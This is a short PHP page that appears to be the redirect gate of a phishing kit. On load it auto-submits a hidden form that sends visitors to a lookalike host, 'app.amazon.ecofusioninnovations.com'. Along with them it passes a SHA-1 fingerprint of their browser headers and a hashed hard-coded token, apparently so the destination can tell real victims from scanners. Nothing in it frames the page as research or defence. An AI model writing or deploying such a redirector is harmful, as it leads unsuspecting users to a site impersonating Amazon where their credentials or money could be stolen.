<?php
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$accept = $_SERVER['HTTP_ACCEPT'];
$url = "https://app.amazon.ecofusioninnovations.com/";
$password = "webapi";
?>

<html>

<title>Redirecting...</title>

<body onload="document.form.submit()">
  <form name="form" id="form" action="<?php echo $url; ?>" method="get">
    <input type="hidden" name="<?php echo sha1($user_agent . $accept); ?>" value="<?php echo sha1($password); ?>">
  </form>
</body>

</html>
